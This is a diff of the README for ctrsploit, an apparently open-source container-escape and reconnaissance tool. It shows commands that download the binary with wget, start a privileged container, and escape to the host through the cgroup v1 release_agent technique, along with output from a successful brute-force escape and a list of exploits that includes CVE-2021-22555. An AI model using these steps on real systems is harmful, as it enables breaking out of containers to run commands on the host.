@@ -3,20 +3,12 @@
 [中文文档](./README-ZH.md)
 
 ## Pre-Built Release
+
 https://github.com/ssst0n3/ctrsploit/releases
 
 ## Usage
+
 ### Quick-Start
-
-## Details
-### exploit
-| exploit | alias | description | doc |
-| --- | --- | --- | --- |
-| cgroupv1-release_agent | ra | escape tech by using the notify_on_release of cgroup v1 | [doc](./exploit/cgroupv1-release_agent/README.md) |
-| cgroupv1-release_agent-unknown_rootfs | ra3 | escape tech by using the notify_on_release of cgroup v1 without known rootfs | [doc](./exploit/cgroupv1-release_agent-unknown_rootfs/README.md) |
-| cve-2021-22555 | 22555 | escape tech by using the CVE-2021-22555 | [doc](./exploit/CVE-2021-22555/README.md) |
-
-### help
 
 ```
 wget -O ctrsploit https://github.com/ssst0n3/ctrsploit/releases/download/v0.1/ctrsploit_linux_amd64 && chmod +x ctrsploit
@@ -39,52 +31,6 @@ COMMANDS:
 GLOBAL OPTIONS:
    --lang value  language for the greeting (default: "english")
    --help, -h    show help (default: false)
-```
-
-### run a exploit
-
-```
-root@2aa13a052102:/# ./ctrsploit e
-NAME:
-   ctrsploit exploit - run a exploit
-
-USAGE:
-   ctrsploit exploit command [command options] [arguments...]
-
-COMMANDS:
-   cgroupv1-release_agent, ra                       escape tech by using the notify_on_release of cgroup v1
-   cgroupv1-release_agent-unknown_rootfs, ra3       escape tech by using the notify_on_release of cgroup v1 without known rootfs
-   help, h                                          Shows a list of commands or help for one command
-
-OPTIONS:
-   --help, -h  show help (default: false)
-
-```
-
-eg. : escape by 'cgroupv1-release_agent' tech.
-
-```
-root@host # docker run -ti --rm --security-opt="apparmor=unconfined" --cap-add="sys_admin" busybox
-root@ctr # wget -O ctrsploit https://github.com/ssst0n3/ctrsploit/releases/download/v0.1/ctrsploit_linux_amd64 && chmod +x ctrsploit
-root@ctr # ./ctrsploit e ra -c "cat /etc/hostname"
-```
-
-if we do not know the rootfs of container, ctrsploit can still escape by release agent tech
-
-```
-[root@container /]# ./ctrsploit e ra3 -c "cat /etc/hostname"
-INFO[0000] trying 100                                   
-INFO[0000] trying 200                                   
-INFO[0000] trying 300                                   
-INFO[0000] trying 400                                   
-INFO[0000] trying 500                                   
-...
-INFO[0017] trying 11700                                 
-INFO[0017] found /output140128693, success              
-INFO[0018] 
-===========start of result==============
-cce-arm-euler28-30231
-===========end of result============== 
 ```
 
 ### gather information
@@ -128,53 +74,54 @@ cgroup contains 'kubepods': ✘
 => is in k8s: ✘ 
 ```
 
-cgroup version
+### run a exploit
 
 ```
-root@ctr:/# ./ctrsploit env c
-INFO[0000] ===========Cgroups=========
-is cgroupv1: ✘
-is cgroupv2: ✔ 
-```
+root@2aa13a052102:/# ./ctrsploit e
+NAME:
+   ctrsploit exploit - run a exploit
 
-graph driver
+USAGE:
+   ctrsploit exploit command [command options] [arguments...]
 
-```
-root@ctr:/# ./ctrsploit env g
-INFO[0000] ===========Overlay=========
-Overlay enabled: false 
-INFO[0000] ===========DeviceMapper=========
-DeviceMapper enabled: true
-DeviceMapper used: true
-The number of devicemapper used in running container: 11 ( =(count(running containers)+1) )
-The host path of container's rootfs: /var/lib/docker/devicemapper/mnt/1659264e845b55b8c9ec42034d7d2dcc23159ebd06f3c69983e764f26eab9721/rootfs 
-```
+COMMANDS:
+   cgroupv1-release_agent, ra                       escape tech by using the notify_on_release of cgroup v1
+   cgroupv1-release_agent-unknown_rootfs, ra3       escape tech by using the notify_on_release of cgroup v1 without known rootfs
+   help, h                                          Shows a list of commands or help for one command
 
-capability
+OPTIONS:
+   --help, -h  show help (default: false)
 
 ```
-root@ctr:/# ./ctrsploit env cap
-INFO[0000] ===========Capability=========
-pid 1
-[caps]
-0xa82425fb != default(0xa80425fb)
 
-[parsed]
-[CAP_CHOWN CAP_DAC_OVERRIDE CAP_FOWNER CAP_FSETID CAP_KILL CAP_SETGID CAP_SETUID CAP_SETPCAP CAP_NET_BIND_SERVICE CAP_NET_RAW CAP_SYS_CHROOT CAP_SYS_ADMIN CAP_MKNOD CAP_AUDIT_WRITE CAP_SETFCAP]
+eg. : escape by 'cgroupv1-release_agent' tech.
 
-[Additional Capabilities]
-["CAP_SYS_ADMIN"]
-
-current process
-[caps]
-0xa82425fb != default(0xa80425fb)
-
-[parsed]
-[CAP_CHOWN CAP_DAC_OVERRIDE CAP_FOWNER CAP_FSETID CAP_KILL CAP_SETGID CAP_SETUID CAP_SETPCAP CAP_NET_BIND_SERVICE CAP_NET_RAW CAP_SYS_CHROOT CAP_SYS_ADMIN CAP_MKNOD CAP_AUDIT_WRITE CAP_SETFCAP]
-
-[Additional Capabilities]
-["CAP_SYS_ADMIN"]
 ```
+root@host # docker run -ti --rm --security-opt="apparmor=unconfined" --cap-add="sys_admin" busybox
+root@ctr # wget -O ctrsploit https://github.com/ssst0n3/ctrsploit/releases/download/v0.1/ctrsploit_linux_amd64 && chmod +x ctrsploit
+root@ctr # ./ctrsploit e ra -c "cat /etc/hostname"
+```
+
+## Details
+
+### env
+
+| command | alias | description |
+| --- | --- | --- |
+| [where](./env/where/README.md) | w | detect whether you are in the container, and which type of the container |
+| [graphdriver](./env/graphdriver/README.md) | g | detect graphdriver type and extend information |
+| [cgroups](./env/cgroups/README.md) | c | gather cgroup information |
+| [capability](./env/capability/README.md) | cap | show the capability of pid 1 and current process |
+| seccomp | s | show the seccomp info |
+| apparmor | a | show the apparmor info |
+
+### exploit
+
+| exploit | alias | description |
+| --- | --- | --- |
+| [cgroupv1-release_agent](./exploit/cgroupv1-release_agent/README.md) | ra | escape tech by using the notify_on_release of cgroup v1 |
+| [cgroupv1-release_agent-unknown_rootfs](./exploit/cgroupv1-release_agent-unknown_rootfs/README.md) | ra3 | escape tech by using the notify_on_release of cgroup v1 without known rootfs |
+| [cve-2021-22555](./exploit/CVE-2021-22555/README.md) | 22555 | escape tech by using the CVE-2021-22555 |
 
 ## Todo List
 
